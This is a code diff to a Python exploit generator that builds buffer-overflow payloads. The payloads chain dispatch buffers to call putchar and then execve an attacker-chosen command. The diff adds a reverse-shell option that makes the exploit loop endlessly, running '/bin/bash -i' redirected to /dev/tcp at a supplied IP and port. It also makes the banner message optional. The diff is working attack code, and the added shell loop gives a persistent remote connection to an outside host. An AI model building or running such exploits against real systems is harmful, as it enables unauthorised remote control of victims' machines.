@@ -156,7 +156,14 @@ parser.add_argument('-m', '--msg', type=str, help='string to print out', default
 parser.add_argument('--buffer-size', type=int, help='size of buffer to overflow', default=10000)
 parser.add_argument('--buffer-address', type=lambda x: int(x,0), help='address of overflowable buffer', default=0x2aaaaad480)
 parser.add_argument('-e','--execve', type=ast.literal_eval, help="python list of strings to execve: \"['/bin/bash', '-c', 'echo \\'run a script\\'; echo \\'like this\\'; /bin/bash']\"", default=["/bin/bash"])
+parser.add_argument('-r', '--reverse-shell', type=str, metavar='IP:port', help="Spin on opening a reverse shell to IP:port - overrides execve argument")
 args = parser.parse_args()
+
+if args.reverse_shell is not None:
+    IP, port = args.reverse_shell.split(':')
+    print('exploit will open reverse shell to:', IP, port)
+    # Keep on retrying to open the reverse shell with while true
+    args.execve = ['/bin/bash', '-c', 'cd /\n while true; do\n /bin/bash -i 2>/dev/null >& /dev/tcp/' + IP + '/' + port + ' 0>&1\n done\n']
 
 dispatch_file = open(args.out, 'w')
 
@@ -174,8 +181,10 @@ buf2.set_a3(load_regs_from_t0)
 
 bufs = [buf1, buf2]
 
-# Add more dispatch buffers to chain calls to putchar
-print_string(args.msg + '\n', bufs)
+# Check if the exploit should print a message
+if args.msg != None and args.msg != '':
+    # Add more dispatch buffers to chain calls to putchar
+    print_string(args.msg + '\n', bufs)
 
 # Add a buffer with the array of strings following the putchars
 execve_strbuf = stringArrayBuf(bufs[-1].next_dispatch_buf, args.execve)
